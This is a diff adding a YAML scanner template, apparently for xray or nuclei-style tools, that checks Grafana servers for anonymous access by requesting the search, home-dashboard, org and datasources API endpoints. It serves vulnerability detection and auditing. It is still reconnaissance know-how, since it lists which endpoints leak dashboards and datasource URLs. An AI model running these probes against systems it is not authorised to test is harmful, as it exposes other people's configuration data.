@@ -1,0 +1,27 @@
+name: poc-yaml-grafana-unauth-access
+groups:
+  dashboard-search-exposed:
+    - method: GET
+      path: /api/search?type=dash-db
+      expression: |
+        response.status == 200 && response.content_type.icontains("json") && response.body.bcontains(b"\"uid\"") && response.body.bcontains(b"\"title\"") && (response.body.bcontains(b"\"type\":\"dash-db\"") || response.body.bcontains(b"\"folderTitle\""))
+  home-dashboard-exposed:
+    - method: GET
+      path: /api/dashboards/home
+      expression: |
+        response.status == 200 && response.content_type.icontains("json") && response.body.bcontains(b"\"dashboard\"") && response.body.bcontains(b"\"meta\"")
+  org-info-exposed:
+    - method: GET
+      path: /api/org
+      expression: |
+        response.status == 200 && response.content_type.icontains("json") && response.body.bcontains(b"\"id\"") && response.body.bcontains(b"\"name\"") && (response.body.bcontains(b"\"address\"") || response.body.bcontains(b"\"orgId\""))
+  datasource-exposed:
+    - method: GET
+      path: /api/datasources
+      expression: |
+        response.status == 200 && response.content_type.icontains("json") && response.body.bcontains(b"\"type\"") && response.body.bcontains(b"\"url\"") && (response.body.bcontains(b"\"database\"") || response.body.bcontains(b"\"access\""))
+detail:
+  author: adysec/nuclei_poc
+  description: Grafana anonymous access exposes dashboards or configuration APIs
+  links:
+    - https://github.com/adysec/nuclei_poc
